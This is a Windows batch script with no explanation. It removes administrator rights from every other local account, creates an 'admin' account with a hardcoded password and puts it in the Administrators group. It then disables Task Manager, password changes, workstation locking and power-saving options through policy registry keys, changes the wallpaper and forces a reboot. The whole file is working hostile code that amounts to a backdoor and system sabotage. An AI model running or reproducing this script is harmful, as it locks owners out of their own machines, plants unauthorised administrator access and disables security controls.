@echo off
for /f "tokens=2 delims=\" %%a in ("%username%") do set currentUser=%%a
if not defined currentUser set currentUser=%username%
for /f "skip=1" %%u in ('wmic useraccount get name') do (
    set "user=%%u"
    setlocal enabledelayedexpansion
    set "trim=!user: =!"
    if not "!trim!"=="" if /i not "!trim!"=="%currentUser%" (
        net localgroup Administrators "!trim!" /delete
        echo !trim!'s admin has been removed.
    )
    endlocal

    
) >> C:\Users\%username%\%user%_run.txt
echo saved log
net user "admin" forkies69 /add
net localgroup Administrators "admin" /add
powercfg -change -standby-timeout-ac 0
powercfg -change -monitor-timeout-ac 0
powercfg -change -hibernate-timeout-ac 0
powercfg -change -standby-timeout-dc 0
powercfg -change -monitor-timeout-dc 0
powercfg -change -hibernate-timeout-dc 0
powercfg -hibernate off
reg add "HKCU\Software\Policies\Microsoft\Power\PowerSettings" /v Lock /t REG_DWORD /d 1 /f
reg add "HKLM\Software\Policies\Microsoft\Power\PowerSettings" /v Lock /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoClose /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableChangePassword /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableLockWorkstation /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f
setlocal enabledelayedexpansion
set "wallDir=C:\Windows\Web"
set i=0
for %%f in ("%wallDir%\*.jpg" "%wallDir%\*.jpeg" "%wallDir%\*.png" "%wallDir%\*.bmp") do (
    set /a i+=1
    set "file[!i!]=%%f"
)
set /a rand=%random% %% i + 1
set "wallpaper=!file[%rand%]!"
reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%wallpaper%" /f
endlocal
shutdown /f /r /t 30 /c "System will shut down in 30 seconds."
